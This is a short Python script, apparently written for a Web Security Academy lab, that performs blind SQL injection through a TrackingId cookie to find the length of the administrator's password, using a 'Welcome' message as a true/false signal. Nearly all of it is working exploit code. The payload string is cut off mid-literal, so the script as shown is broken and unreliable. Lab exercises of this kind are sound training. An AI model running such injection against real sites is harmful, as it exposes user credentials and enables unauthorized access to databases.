import requests
import string

url = "https://0a4d003d03b8ef9381cf6191006700e4.web-security-academy.net/"

#Crafting the method
def requestLab(url,payload):
    cookies = {
        "TrackingId":"kx7OnRsyLphvFeC8"+payload,
        "session": "812WF8JTV7ax0LedTOGcRp6LzfCgF0AG"
    }
    r = requests.get(url, cookies=cookies)
    return r.text

#Inserting the payload into the request
found = None
for pass_length in range(25):
    PAYLOAD = (f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{pass_length})='a>
    response = requestLab(url, PAYLOAD)

    if "Welcome" not in response:
        found = pass_length
        break
    else:
        print("Checking..",pass_length)
print("Password length:", found)
